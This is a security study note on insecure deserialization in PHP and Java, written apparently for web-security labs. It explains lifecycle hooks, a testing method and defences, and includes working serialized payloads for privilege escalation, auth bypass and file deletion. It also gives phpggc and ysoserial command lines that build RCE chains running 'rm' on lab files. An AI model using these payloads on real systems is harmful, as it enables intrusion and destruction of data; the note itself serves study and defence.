---
created: 2026-07-19
tags:
  - web_hacking
  - insecure_design
status: substantial
---
## Serialization and deserialization

>**Serialization** is the process of converting an in-memory data structure or object into a linear byte stream or structured text representation that can be persisted (to disk or a database) or transmitted (over a network) and later reconstructed in the same — or a different — runtime environment.

- Serialization allows an application to freeze the state of a complex object (e.g., a `User`, a `Session`) and resurrect it later with the same fields, references, and class membership.
- **Deserialization** is the inverse process: parsing a serialized byte stream and reconstructing the original object graph, including class identities, field values, and any behavioral metadata that was preserved during serialization.

There are three main categories of serialization formats:

| Category | Encodes class info | Invokes lifecycle methods | Examples |
|----------|--------------------|---------------------------|----------|
| **Text-based, schemaless** | No (unless extended) | No | JSON, XML, YAML, CSV |
| **Native binary** | Yes | Yes | Java `ObjectOutputStream`, .NET `BinaryFormatter`, Python pickle |
| **Native text/hybrid** | Yes | Yes | PHP `serialize()`, Ruby `Marshal` |

- Formats that encode class information and invoke lifecycle methods (like Java, PHP, .NET native serializers) are inherently dangerous because the byte stream itself names classes the runtime must instantiate and methods the runtime must invoke.
- JSON and XML ship only data, making them generally safe unless a wrapper layer (like `JsonConvert.DeserializeObject` with `TypeNameHandling.All`) reintroduces class binding.

> [!note]
> Deserialization is also called **unmarshalling**, **decoding**, or **unpickling** (Python).

## Insecure deserialization

>**Insecure deserialization** is a vulnerability that arises when an application deserializes data that an attacker can influence, without first validating or restricting the type of object that may be reconstructed. This allows the attacker to manipulate the state, class identity, or behavioral callbacks of the resulting object graph.

> [!important]+ Classification
> - Insecure Deserialization maps to:
> 	- [`CWE-502: Deserialization of Untrusted Data`](https://cwe.mitre.org/data/definitions/502.html)

- The vulnerability is *not* about deserialization producing the wrong data. It is about deserialization producing a *fully constructed live object* whose constructors, finalizers, and serialization callbacks have already executed by the time the application gets to inspect the result.
- **Object injection** is a specific class of insecure deserialization where the attacker substitutes the serialized payload with an object of a different class to invoke that foreign class's lifecycle methods.

### Why deserialization itself is the attack

When a runtime parses a serialized object, it does far more than just copy bytes into fields. 

In Java, the sequence is:
1. `ObjectInputStream.readObject()` receives attacker-controlled bytes.
2. The JVM reads class descriptors from the stream and loads each class via its `ClassLoader`. Static initializers (`<clinit>`) fire.
3. Memory is allocated and an instance is created **without** the public constructor running (using a special path).
4. If the class defines a private `readObject(ObjectInputStream)` method, it is invoked automatically. This method has full access to the stream and can execute any logic.
5. If `readResolve()` is defined, it runs after `readObject()`.
6. If the deserialized object is inserted into a hash-based collection encoded in the same stream, the collection calls `hashCode()` and `equals()` on it. Both methods can be attacker-influenced.
7. Only after all this does control return to the application.

> [!important]
> The majority of deserialization exploits complete their work **before** `unserialize()`/`readObject()` returns. The application never sees the malicious object as a usable value; the damage is done by the lifecycle hooks the runtime invoked during reconstruction. Validation that runs after the deserialization method returns is already too late.

#### PHP deserialization in slow motion

Consider this vulnerable PHP code:

```php
class Session {
    public $username;
    public $isAdmin;

    public function __wakeup() {
        $this->loadProfile();
    }

    private function loadProfile() {
        include "/var/profiles/" . $this->username . ".php";
    }
}

$cookie = base64_decode($_COOKIE['session']);
$session = unserialize($cookie);
if (!$session->isAdmin) {
    http_response_code(403);
    die("Not an admin");
}
```

When an attacker sends a manipulated cookie where `$username = "../../../../tmp/payload"`, the events unfold as follows:
1. The cookie is base64-decoded and passed to `unserialize()`.
2. `unserialize()` allocates a `Session` object.
3. The attacker-controlled properties are assigned.
4. The runtime checks for `__unserialize()` (absent) and falls back to `__wakeup()`. `__wakeup()` is invoked.
5. `__wakeup()` calls `loadProfile()`, which concatenates `$this->username` into an `include` path.
6. The runtime includes and executes attacker-controlled PHP from `/tmp/payload.php`.
7. **Only now does `unserialize()` return.** The application's `$session->isAdmin` check executes, but the attacker has already achieved remote code execution.

## Methodology

Follow a systematic workflow for testing insecure deserialization:

1. **Identify serialized data endpoints**: Look for session cookies, hidden form fields, `Authorization: Bearer` headers (non-JWT), Java `ViewState`, ASP.NET `__VIEWSTATE`, or cached objects.
2. **Capture and decode**: Peel away encoding layers (URL-decode, Base64-decode, gzip decompression).
3. **Fingerprint the format**: Identify whether the format is PHP, Java, .NET, Python, etc.
4. **Parse the structure**: Note the class name, every property, type tags, and length prefixes.
5. **Map fields to behavior**: Determine what the application does with each attribute (e.g., authorization, file paths).
6. **Choose an attack class**:
   - **Attribute tampering**: Change a boolean or value (e.g., `admin=true`).
   - **Type confusion**: Swap a string for an integer to abuse loose comparisons.
   - **Functional sink abuse**: Repoint a path/URL used by the application (e.g., `unlink($path)`).
   - **Arbitrary object injection**: Supply a different class that has a useful magic method.
   - **Library gadget chain**: Use prebuilt chains (e.g., via `phpggc` or `ysoserial`) to achieve RCE.
7. **Build and re-wrap the payload**: Recompute any length prefixes, re-apply encodings, and send the request.
8. **Observe**: Watch for out-of-band callbacks, stack traces (which leak class names), or state changes.

> [!tip] Errors are intelligence. A PHP fatal error showing `__PHP_Incomplete_Class_Name` means a class is missing. A Java `ClassNotFoundException` reveals what class the application expected.

### Format fingerprints

| Format | Raw signature | Base64 signature | Other hints |
|--------|---------------|-------------------|-------------|
| PHP `serialize()` | `O:` `a:` `s:` `i:` `b:` `N;` | `Tzo` (for `O:`), `YTo` (for `a:`) | Often raw-readable; `Content-Type` rarely set |
| Java `ObjectOutputStream` | `\xAC\xED\x00\x05` | `rO0AB` | `Content-Type: application/x-java-serialized-object`; gzip wrapper starts `H4sI` |
| .NET `BinaryFormatter` | `\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF` | `AAEAAAD/////` | Often inside `__VIEWSTATE` |
| Python pickle | `\x80\x04` / `\x80\x05` | `gASV` / `gAUV` | Rare in web apps but seen in ML tools |
| Ruby Marshal | `\x04\x08` | `BAh` | Legacy Rails session cookies |

## Attack classes

### Manipulating object attributes

The simplest exploit involves leaving the class intact and editing attribute values.

In PHP, a serialized object looks like this:
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
- `O:4:"User":2:`: Object of class `User` (length 4) with 2 properties.
- `s:8:"username";s:6:"wiener";`: String property `username` (length 8) with string value `wiener` (length 6).
- `s:5:"admin";b:0;`: String property `admin` (length 5) with boolean value false (`0`).

To escalate privileges, flip the boolean to `b:1;` and ensure any string length prefixes are updated if string values change.

### Modifying data types (Type confusion)

If the application compares deserialized attributes with PHP's loose-equality operator `==`, the type tag is an attacker-controlled primitive.

In PHP 7.x and earlier:
- `0 == "abc"` evaluates to `true` (non-numeric string coerces to `0`).
- `5 == "5abc"` evaluates to `true` (leading-numeric strings coerce to their integer prefix).

If an application checks `$stored_token == $user->access_token`, replacing the expected string token with an integer `0` can bypass authentication:
```php
// Original: 
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"token_string_here";}

// Exploit: 
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

### Abusing application functionality (Functional sinks)

If an application uses a deserialized attribute in a sensitive operation, such as a file path for deletion, it can be exploited.

For example, if an object has an `avatar_link` attribute:
```php
O:4:"User":3:{s:8:"username";s:5:"gregg";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```
If the application calls `unlink($user->avatar_link)` upon account deletion, you can change the path to an arbitrary file (e.g., `/home/carlos/morale.txt`) and delete your account to remove the target file.

### Arbitrary object injection and magic methods

In PHP, **magic methods** (starting with `__`) are invoked automatically during specific object lifecycle events.

| Method | Trigger | Exploitability |
|--------|---------|----------------|
| `__wakeup()` | Immediately after `unserialize()` | High (common entry point) |
| `__destruct()` | Object is destroyed (script end, exception) | High (fires even on parse errors) |
| `__toString()` | Object used in string context | Medium/High (pivot for chains) |
| `__call()` | Calling an inaccessible method | Medium |

If a class in the application (even one not expected by the deserialization endpoint) contains a magic method that executes a dangerous sink (e.g., `eval`, `system`, `unlink`), you can inject that class instead of the expected one.

Example vulnerable class:
```php
class CustomTemplate {
    private $lock_file_path;
    public function __destruct() {
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
```
Payload to trigger arbitrary file deletion:
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

## Gadget chains

A **gadget** is a method that performs a dangerous action when its parameters are attacker-controlled. A **gadget chain** (or POP chain) is an ordered sequence of gadgets where triggering the first automatically triggers the next, leading to a sink (like RCE).

Instead of writing new code, you reuse existing code in the application's libraries in an order never intended by the developers.

### PHP chains and PHPGGC

[`PHPGGC`](https://github.com/ambionics/phpggc) (PHP Generic Gadget Chains) is a tool that generates serialized payloads for popular PHP frameworks.

```bash
# List available chains
./phpggc -l

# Generate a Base64-encoded payload for Symfony RCE
./phpggc -b Symfony/RCE4 system 'rm /home/carlos/morale.txt'
```

#### Fast-destruct and length-check bypass

Applications may validate the deserialized object's structure and abort if it's incorrect. You can bypass this by appending unparseable trailing garbage to the serialized object. 
PHP's `unserialize()` will return `false`, skipping the application's validation logic, but the partially constructed object will immediately trigger `__destruct()` during garbage collection.

Use the `-f` (fast-destruct) flag in PHPGGC:
```bash
./phpggc -b -f Symfony/RCE4 system 'rm /tmp/pwn'
```

### Java native serialization and ysoserial

Java serialization is binary and highly dangerous because reflection is unrestricted and classes like `InvokerTransformer` allow arbitrary method invocation.

[`ysoserial`](https://github.com/frohoff/ysoserial) generates Java payloads.

```bash
# Generate payload for Apache Commons Collections 4
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0
```

> [!tip] **Out-of-band detection**: Always use the `URLDNS` payload first to confirm vulnerability safely. It triggers a DNS lookup without executing arbitrary commands.
> ```bash
> java [flags] -jar ysoserial-all.jar URLDNS 'http://YOUR-COLLABORATOR-ID.oastify.com' | base64 -w0
> ```

### Other formats

- **.NET `BinaryFormatter`**: Exploited using [`ysoserial.net`](https://github.com/pwntester/ysoserial.net).
- **Python Pickle**: Inherently dangerous; `__reduce__()` allows arbitrary command execution without complex gadget chains.
- **Ruby Marshal**: Can be exploited via `_load` or `marshal_load` using documented gadget chains.

## Defenses

- **Do not deserialize untrusted input with a native serializer.** This is the only robust defense.
- Use schemaless, data-only formats (like JSON) and reconstruct trusted types manually.
- If native serialization must be used, cryptographically sign the data (e.g., HMAC) before sending it to the client, and verify the signature before deserialization.
- Implement strict type restrictions (e.g., Java 9+ `ObjectInputFilter`, PHP 7+ `allowed_classes`).
- Patch dependencies regularly to mitigate known gadget chains.
